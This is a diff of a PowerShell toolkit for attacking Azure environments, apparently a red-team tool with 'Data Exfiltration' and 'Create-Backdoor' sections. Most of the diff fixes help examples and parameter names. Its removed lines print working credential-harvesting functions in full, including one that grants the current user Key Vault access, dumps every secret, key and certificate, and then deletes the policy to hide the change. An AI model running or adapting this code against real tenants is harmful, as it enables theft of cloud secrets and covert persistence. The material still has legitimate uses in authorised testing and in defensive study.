@@ -177,10 +177,6 @@ Reader			Get-AADRoleMembers - Lists the active roles in Azure AD and what users 
 Reader          Get-KeyVaults - Lists the Key Vaults
 Contributor     Get-KeyVaultContents - Get the keys, secrets, and certificates from a specific Key Vault
 Contributor     Get-AllKeyVaultContents - Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to 
-Contributor     Get-AppSecrets - Returns the application passwords or certificate credentials
-Contributor     Get-AllAppSecrets - Returns all application passwords or certificate credentials (If accessible)
-Contributor     Get-AllSecrets - Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
-Contributor     Get-AutomationCredentials - Gets the credentials from any Automation Accounts
            
                 -----------------Data Exfiltration--------------
             
@@ -370,8 +366,8 @@ function Get-GroupMembers
     OutFile (Optional) (.csv is special)
 
 .EXAMPLE
-    Get-AzureGroupMembers -Group 'SQL Users'
-    Get-AzureGroupMembers -Group 'SQL Users' -OutFile users.csv
+    Get-GroupMembers -Group 'SQL Users'
+    Get-GroupMembers -Group 'SQL Users' -OutFile users.csv
     
 #>
     [CmdletBinding()]
@@ -421,7 +417,7 @@ function Get-AllGroupMembers
     OutFile (.csv not supported)
 
 .EXAMPLE
-    Get-AllAzureGroupMembers -OutFile members.txt
+    Get-AllGroupMembers -OutFile members.txt
     
 #>
     [CmdletBinding()]
@@ -496,9 +492,9 @@ function Get-AllRoleMembers
 .PARAMETERS
     OutFile (.csv is special)
 .EXAMPLE
-    Get-AllAzureRoleMembers
-    Get-AllAzureRoleMembers -OutFile users.csv
-    Get-AllAzureRoleMembers -outFile users.txt
+    Get-AllRoleMembers
+    Get-AllRoleMembers -OutFile users.csv
+    Get-AllRoleMembers -outFile users.txt
 #>
 
     [CmdletBinding()]
@@ -543,7 +539,7 @@ function Get-Roles
     -User (john@contoso.com)
 
 .EXAMPLE
-    Get-Rolesr -User john@contoso.com
+    Get-Roles -User john@contoso.com
 #>
     [CmdletBinding()]
     Param(
@@ -570,7 +566,7 @@ function Get-RoleMembers
     -Role
 
 .EXAMPLE
-    Get-RoleMembers Reader
+    Get-RoleMembers -Role Reader
     
 #>
     [CmdletBinding()]
@@ -919,7 +915,7 @@ function Get-ServicePrincipal
 .PARAMETER
     -Id (Id of SP)
 .EXAMPLE
-    Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb
+    Get-ServicePrincipal -Id fdb54b57-a416-4115-8b21-81c73d2c2deb
 #>
     
         [CmdletBinding()]
@@ -947,7 +943,6 @@ function Get-Apps
     az ad app list --query '[].{Name:displayName,Id:appId}' -o table
 
 }
-
 function Get-AppPermissions
 {
 <#
@@ -973,103 +968,7 @@ function Get-AppPermissions
         az ad app permission list --id $Id
      }
 }
-
-function Get-AppSecrets
-{
-<#
-.SYNOPSIS
-    Returns the application passwords or certificate credentials
-.PARAMETER
-    Name of App
-.EXAMPLE
-    Get-AppSecrets
-#>
-        [CmdletBinding()]
-         Param(
-         [Parameter(Mandatory=$false)][String]$Id = $null)
-         if($Id -eq "")
-         {
-            Write-Host "Requires Application Id" -ForegroundColor Red
-            Write-Host "Usage example: Get-AppSecrets --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
-         }
-         else
-         {
-
-            az ad app credential list --id $Id
-         }
-}
-
-function Get-AllAppSecrets
-{
-<#
-.SYNOPSIS
-    Returns all application passwords or certificate credentials (If accessible)
-#>
-
-    $ErrorActionPreference = "SilentlyContinue"
-    $ids=az ad app list --query='[].{id:objectId}' -o tsv
-    ForEach ($id in $ids){
-                 az ad app credential list --id $id | ConvertFrom-Json
-                    }
-        
-}
-
-function Get-AllSecrets 
-{
-<# 
-.SYNOPSIS
-    Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
-
-#>
-    Write-Host "Gathering all keys from key vaults, this may take a moment"
-    $vaults = az keyvault list --query '[].name' -o tsv
-    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
-    ForEach ($vault in $vaults)
-    {
-		$access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
-            if(!$access)
-            {
-               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
-               continue
-            }
-        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
-		$kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-		$cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-		ForEach ($i in $ids)
-		{
-			Write-Host "Vault: " $i
-			az keyvault secret show --id $i -o table
-			Write-Host ""
-		}
-		ForEach ($kid in $kids)
-		{
-			Write-Host "Vault: " $kid
-			az keyvault secret show --id $kid -o table
-			Write-Host ""
-		}
-		ForEach ($cid in $cids)
-		{
-			Write-Host "Vault: " $cid
-			az keyvault secret show --id $cid -o table
-			Write-Host ""
-		}
-		$removeaccess = az keyvault delete-policy --name $vault --upn $User
-    }
-    Write-Host ""
-    Write-Host "Gathering all secrets from applications, this may take a moment"    
-    $ids=az ad app list --query='[].{id:objectId}' -o tsv
-    ForEach ($id in $ids){
-                 az ad app credential list --id $id | ConvertFrom-Json
-                    } 
-    Write-Host ""
-    Write-Host "Listing Automation Account Credentials. Unforunately passwords are abstraced :("
-    $Data = Get-AzAutomationAccount
-    $RG = $Data.ResourceGroupName
-    $AA = $Data.AutomationAccountName
-    Get-AzAutomationCredential -AutomationAccountName $AA -ResourceGroupName $RG
-
-}
-
+      
 function Get-WebApps
 {
 <#
@@ -1087,7 +986,7 @@ function Get-WebAppDetails
 .PARAMETER
     -Name (of webapp)
 .EXAMPLE
-    Get-WebAppDetails WebAppName
+    Get-WebAppDetails -NameWebAppName
 #>
         [CmdletBinding()]
          Param(
@@ -1200,7 +1099,7 @@ function Upload-StorageContent
 .PARAMETER
     
     -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
-    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
+    -File (File to upload)
     -Share (Share name to upload to)
 .EXAMPLE
     
@@ -1249,7 +1148,7 @@ function Get-StorageAccountKeys
 .SYNOPSIS 
     Gets the account keys for a storage account
 .PARAMETER
-    -group
+    -ResourceGroup
     -account 
     -kerb (optional, use if kerberos keys are suspected)
 .EXAMPLE
@@ -1446,39 +1345,6 @@ function Restart-VM
 
         az vm restart -n $VM -g $ResourceGroup
      }
-}
-
-function Get-AutomationCredentials 
-{
- <#
-.SYNOPSIS
-    Gets the credentials from any Automation Accounts
-.PARAMETER
-    -AutomationAccount (Name of Automation account)
-    -ResourceGroup (Resource group it's located in)
-.EXAMPLE
-    Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
-        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
-
-     if($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
-     }
-     elseif($AutomationAccount -eq "")
-     {
-        Write-Host "Requires Automation Account name" -ForegroundColor Red
-        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
-     }
-     else
-     {
-        Get-AzAutomationCredential -AutomationAccountName $AutomationAccount -ResourceGroupName $ResourceGroup
-     }
-
 }
 
 function Get-Runbooks
@@ -1767,7 +1633,6 @@ function Execute-Script
 	}
 }
 
-
 function Execute-Program
 {
  <#
@@ -1879,7 +1744,7 @@ function Create-Backdoor
     -NewPassword (Password for that new account)
 
 .EXAMPLE
-    Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
+    Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
 #>
         [CmdletBinding()]
          Param(
